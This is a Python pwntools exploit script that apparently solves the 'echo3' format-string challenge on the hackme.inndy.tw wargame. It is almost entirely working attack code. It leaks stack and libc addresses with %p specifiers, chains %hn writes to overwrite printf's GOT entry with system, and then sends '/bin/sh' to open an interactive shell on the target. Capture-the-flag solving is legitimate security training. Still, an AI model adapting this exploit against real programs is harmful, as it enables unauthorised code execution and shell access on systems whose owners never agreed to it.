#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
# context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo3")
if sys.argv[1] == "l":
    #  context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo3")
    #  io = gdb.debug("./echo3", gdbscript = '''
    #          b *0x8048774
    #          b *0x8048646
    #          c
    #          set $eax=0x20
    #          c
    #          c
    #          c
    #          c
    #          c
    #          ''')
    libc = elf.libc

else:
    io = remote("hackme.inndy.tw", 7720)
    #  io = remote("localhost", 9999)
    libc = ELF("./libc-2.23.so.i386")

if __name__ == "__main__":
    '''
    inndy_echo3 [master●●] python rand.py
    0x20	4096    <- pick this random number
    0x1010	2048
    0x1050	2048
    0x1030	4096
    0x2010	2048
    0x30	4096
    0x50	2048
    0x40	4096
    0x3050	2047
    0x3010	2048
    0x2020	4096
    0x1040	4096
    0x1020	4096
    0x3020	4096
    0x10	2048
    0x2040	4096
    0x3030	4096
    0x3040	4096
    0x2050	2048
    0x2030	4096
    '''
    info("1st: leak addr")
    io.sendline("%30$p..%43$p..1111\0")
    # io.recvuntil("0x")
    stack1e = int(io.recvuntil("..", drop = True), 16)
    success("stack1e -> {:#x}".format(stack1e))
    stack14 = stack1e - 0x10c
    success("stack14 -> {:#x}".format(stack14))
    stack15 = stack1e - 0x108
    success("stack15 -> {:#x}".format(stack15))
    libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main']
    libc.address = libc.address - 247 if sys.argv[1] == 'l' else libc.address - 247
    if libc.address & 0xfff != 0:
        io.close()
        print "Fail!"
        exit(0)
    success("libc.address -> {:#x}".format(libc.address))

    info("2nd: make stack1e & stack1f point to stack14 & stack15")
    payload = "%{}c%{}$hn".format(stack14 & 0xffff, 0x1e)
    #  payload += "%{}c%{}$hn".format((stack15 & 0xffff) - (stack14 & 0xffff), 0x1f)
    payload += "%{}c%{}$hn".format(4, 0x1f)
    payload += "2222"
    io.sendlineafter("1111", payload + '\0')

    info("3rd: make stack14 & stack15 point to printf@got & printf@got + 2")
    payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x55)
    #  payload += "%{}c%hn".format(((elf.got['printf'] + 2) & 0xffff) - (elf.got['printf'] & 0xffff), 0x57)
    payload += "%{}c%{}$hn".format(2, 0x57)
    payload += "3333"
    io.sendlineafter("2222", payload + '\0')

    info("4th: overwrite printf@got to system")
    payload = "%{}c%{}$hhn".format(libc.sym['system'] >> 16 & 0xff, 0x14)
    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x15)
    payload += "4444"
    io.sendlineafter("3333", payload + '\0')

    info("5th: triger system('/bin/sh\0')")
    io.sendlineafter("4444", "/bin/sh\0")
     
    io.interactive()
    io.close()

    # $while true; do python exp.py l; done
